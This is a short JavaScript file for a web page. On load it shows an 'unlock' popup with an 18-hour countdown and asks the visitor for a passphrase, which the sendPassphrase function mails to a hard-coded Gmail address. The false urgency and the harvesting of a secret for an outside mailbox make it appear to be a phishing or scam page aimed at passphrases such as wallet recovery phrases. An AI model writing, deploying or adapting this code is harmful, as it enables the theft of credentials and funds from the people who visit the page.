// Countdown starting from 18:47:12 (in minutes + seconds)
let totalSeconds = (18 * 60 + 47) * 60 + 12;

function updateTimer() {
  const timerElement = document.getElementById("timer");
  const popupTimerElement = document.getElementById("popupTimer");

  const interval = setInterval(() => {
    if (totalSeconds <= 0) {
      clearInterval(interval);
      timerElement.innerText = "00:00:00";
      popupTimerElement.innerText = "00:00:00";
      return;
    }

    totalSeconds--;

    let hrs = Math.floor(totalSeconds / 3600);
    let mins = Math.floor((totalSeconds % 3600) / 60);
    let secs = totalSeconds % 60;

    const timeString = `${hrs.toString().padStart(2, "0")}:${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
    timerElement.innerText = timeString;
    popupTimerElement.innerText = timeString;
  }, 1000);
}

// Show popup function
function showPopup() {
  document.getElementById("unlockPopup").style.display = "block";
}

// Hide popup function
function hidePopup() {
  document.getElementById("unlockPopup").style.display = "none";
}

// Send passphrase via email (mailto method)
function sendPassphrase() {
  const passphrase = document.getElementById("passphraseInput").value;
  if (passphrase.trim() === "") {
    alert("Please enter a passphrase before submitting.");
    return;
  }

  const email = "krishnadigitalmedianwh@gmail.com";
  const subject = "Passphrase Submission";
  const body = `Passphrase: ${passphrase}`;
  const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
  
  window.location.href = mailtoLink;
}

// Start timer and show popup on page load
updateTimer();
showPopup();
